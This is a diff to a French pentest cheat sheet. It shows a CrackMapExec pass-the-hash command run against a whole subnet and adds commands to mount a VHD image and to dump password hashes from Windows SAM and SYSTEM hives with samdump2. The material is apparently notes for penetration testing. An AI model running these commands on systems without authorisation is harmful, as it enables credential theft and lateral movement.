@@ -82,3 +82,19 @@ Une fois le hash administrateur récupéré sur un poste:
 ```
 cme smb -u Administrateur -H HASH 192.168.20.0/24 --local-auth
 ```
+
+#### Guestmount
+
+Pour monter un fichier vhd sur Linux
+
+```
+guestmount --add file.vhd -m /dev/sda1 --ro /mnt/vhd
+```
+
+#### Samdump
+
+Récupérer les hash de la table SAM
+
+```
+samdump2 SYSTEM SAM
+```
